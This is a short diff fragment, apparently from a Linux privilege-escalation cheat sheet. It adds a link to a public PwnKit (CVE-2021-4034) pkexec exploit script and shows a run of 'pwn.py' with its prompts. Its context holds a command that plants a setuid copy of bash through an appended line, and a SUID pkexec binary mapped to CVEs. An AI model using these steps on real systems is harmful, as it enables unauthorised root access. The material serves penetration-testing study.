@@ -1332,6 +1332,9 @@ echo "cp /bin/bash /home/sysadmin/bash && chmod u+s /home/sysadmin/bash" >> 00-h
 
 ```
 -rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
+# link
+https://github.com/Almorabea/pkexec-exploit/blob/main/CVE-2021-4034.py
+
 python3 pwn.py 
 Do you want to choose a custom payload? y/n (n use default payload)  n
 [+] Cleaning pervious exploiting attempt (if exist)
